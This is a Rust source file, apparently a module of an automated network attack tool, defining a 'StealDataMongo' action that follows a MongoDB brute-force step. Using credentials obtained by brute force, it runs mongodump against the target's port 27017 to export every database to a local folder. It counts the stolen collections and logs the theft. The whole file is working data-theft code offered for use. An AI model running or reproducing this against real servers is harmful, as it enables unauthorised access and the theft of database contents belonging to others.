use std::sync::Arc;
use std::time::Duration;

use tokio::time::timeout;

use crate::actions::{Action, ActionOutcome, Target};
use crate::state::AppState;

use super::{build_output_dir, get_credentials};

/// Steal data from MongoDB servers by dumping collections.
/// Parent: MongoBruteforce.
pub struct StealDataMongo;

impl Action for StealDataMongo {
    fn name(&self) -> &'static str { "StealDataMongo" }
    fn port(&self) -> Option<u16> { Some(27017) }
    fn parent(&self) -> Option<&'static str> { Some("MongoBruteforce") }

    fn execute<'a>(
        &'a self,
        target: &'a Target,
        state: &'a Arc<AppState>,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = ActionOutcome> + Send + 'a>> {
        Box::pin(run(target, state))
    }
}

async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
    let creds = get_credentials(state, target.host_id, "mongo").await;
    if creds.is_empty() {
        return ActionOutcome::Failed("no credentials".to_string());
    }

    let local_dir = build_output_dir(state, "mongo", &target.mac_address, &target.ip);
    let _ = tokio::fs::create_dir_all(&local_dir).await;

    for (user, password) in &creds {
        if state.shutdown.is_cancelled() {
            break;
        }

        let result = timeout(Duration::from_secs(240), async {
            steal_mongo_data(&target.ip, user, password, &local_dir).await
        })
        .await;

        match result {
            Ok(Ok(count)) if count > 0 => {
                tracing::info!(ip = %target.ip, collections = count, "MongoDB data stolen");
                return ActionOutcome::Success;
            }
            Ok(Err(e)) => tracing::warn!(ip = %target.ip, %e, "MongoDB steal error"),
            _ => {}
        }
    }

    ActionOutcome::Failed("no data stolen".to_string())
}

async fn steal_mongo_data(
    ip: &str,
    user: &str,
    password: &str,
    local_dir: &std::path::Path,
) -> Result<usize, String> {
    let uri = format!("mongodb://{user}:{password}@{ip}:27017");

    // Use mongodump to export all databases
    let result = tokio::process::Command::new("mongodump")
        .args([
            &format!("--uri={uri}"),
            &format!("--out={}", local_dir.display()),
            "--quiet",
        ])
        .output()
        .await
        .map_err(|e| e.to_string())?;

    if result.status.success() {
        // Count dumped collections
        let mut count = 0;
        if let Ok(mut entries) = tokio::fs::read_dir(local_dir).await {
            while let Ok(Some(entry)) = entries.next_entry().await {
                if entry.metadata().await.map(|m| m.is_dir()).unwrap_or(false) {
                    if let Ok(mut sub) = tokio::fs::read_dir(entry.path()).await {
                        while let Ok(Some(f)) = sub.next_entry().await {
                            if f.file_name().to_string_lossy().ends_with(".bson") {
                                count += 1;
                            }
                        }
                    }
                }
            }
        }
        Ok(count)
    } else {
        Err(String::from_utf8_lossy(&result.stderr).to_string())
    }
}
